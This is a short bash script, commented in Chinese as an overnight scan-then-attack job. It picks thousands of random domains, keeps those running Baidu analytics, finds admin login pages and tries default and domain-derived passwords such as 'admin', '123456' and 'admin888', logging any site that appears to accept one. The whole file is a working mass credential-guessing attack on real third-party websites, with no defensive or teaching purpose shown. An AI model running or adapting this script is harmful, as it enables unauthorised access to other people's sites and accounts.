#!/bin/bash
# 通宵扫描: 筛百度收录→攻击
echo "START: $(date)" | tee -a /tmp/on_hits.txt

shuf -n 10000 /tmp/clean_com.txt | while read d; do
  h=$(curl -sk -L --connect-timeout 2 --max-time 4 "http://$d/" 2>/dev/null)
  [ -z "$h" ] && continue
  echo "$h" | grep -qi "hm.baidu.com" || continue
  
  nm=$(echo "$d" | cut -d. -f1)
  for p in /admin /login /admin/login /admin.php; do
    s1=$(curl -sk -L --connect-timeout 2 -o /dev/null -w "%{size_download}" "http://$d$p" 2>/dev/null)
    [ -z "$s1" ] && continue
    [ "$s1" -lt 200 ] && continue
    [ "$s1" -gt 60000 ] && continue
    
    ck="/tmp/on_${d//./_}"
    curl -sk -L -c "$ck" "http://$d$p" -o /dev/null 2>/dev/null
    for pw in admin 123456 admin123 "$nm" "${nm}123" admin888; do
      s2=$(curl -sk -L -b "$ck" "http://$d$p" -X POST -d "username=admin&password=$pw" -o /dev/null -w "%{size_download}" 2>/dev/null)
      if [ "$s2" != "$s1" ] && [ "$s2" -gt 3000 ]; then
        echo "$d|$p|$pw|${s2}B" | tee -a /tmp/on_hits.txt
        break 2
      fi
    done
  done
done

echo "END: $(date)" | tee -a /tmp/on_hits.txt
